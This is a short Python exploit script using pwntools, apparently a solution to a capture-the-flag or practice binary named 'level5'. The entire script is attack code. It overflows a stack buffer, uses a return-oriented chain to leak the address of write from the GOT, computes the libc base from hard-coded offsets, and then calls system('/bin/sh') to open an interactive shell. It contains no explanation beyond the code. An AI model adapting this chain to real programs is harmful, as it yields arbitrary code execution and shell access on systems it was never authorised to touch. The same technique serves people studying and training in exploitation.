from pwn import *
context(arch = 'amd64', os = 'linux')
r=process("./level5")
elf = ELF('./level5')
#libc = ELF('./libc.so.6')

def lg(buf):
    log.success(f'\033[33m{buf}:{eval(buf):#x}\033[0m')

padding = b"a"*0x88
write_addr = elf.got['write']
read_addr = elf.got['read']
write = elf.plt['write']

pop_rdi = 0x400623
pop_rsi_r15 = 0x400621

r.recvuntil("World\n")
payload = padding + p64(pop_rdi) + p64(1) + p64(pop_rsi_r15) + p64(write_addr) + p64(0) + p64(write)
r.send(payload)
write_addr = u64(r.recv(8))
lg("write_addr")

'''
r.recvuntil("World\n")
payload = padding + p64(pop_rdi) + p64(1) + p64(pop_rsi_r15) + p64(read_addr) + p64(0) + p64(write)
r.send(payload)
read_addr = u64(r.recv(8))
lg("read_addr")
'''

base = write_addr - 0x104200
sh = base + 0x1a7e43
system = base + 0x0528f0

r.recvuntil("World\n")
payload = padding + p64(pop_rdi) + p64(sh) + p64(system)
r.send(payload)

r.interactive()
